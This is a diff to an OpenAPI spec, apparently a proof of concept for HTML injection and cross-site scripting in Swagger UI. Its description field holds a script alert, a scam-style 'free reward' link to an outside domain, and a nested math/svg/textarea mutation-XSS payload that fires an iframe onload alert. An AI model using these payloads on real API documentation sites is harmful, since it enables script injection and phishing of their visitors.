@@ -1,7 +1,7 @@
 openapi: "3.0.0"
 
 info:
-  title: Rajnish Swagger HTML injection
+  title: Rajnish Swagger HTML injection (ONLY FOR POC)
   description:
     <h1>GET 1000$ FREE REWARD IN SECONDS TO YOUR BANK ACCOUNT, TO GET <script>alert(1)</script><a href="https://dreamereh.ml">CLICK HERE</a></h1>
     xss<math><mi><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(document.domain)'>"></a></textarea></mtext></svg></mglyph></table></mi></math>
